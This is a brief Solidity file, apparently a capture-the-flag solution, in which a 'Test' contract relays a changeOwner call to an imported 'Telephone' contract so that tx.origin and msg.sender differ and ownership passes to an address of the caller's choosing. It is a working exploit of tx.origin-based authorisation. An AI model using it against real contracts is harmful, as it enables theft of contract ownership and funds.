// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract Test {
    Telephone public telephone;

    constructor(address telephoneContractAddress) public {
        telephone = Telephone(telephoneContractAddress);
    }

    function forwardTransaction(address newOwner) public {
        telephone.changeOwner(newOwner);
    }
}
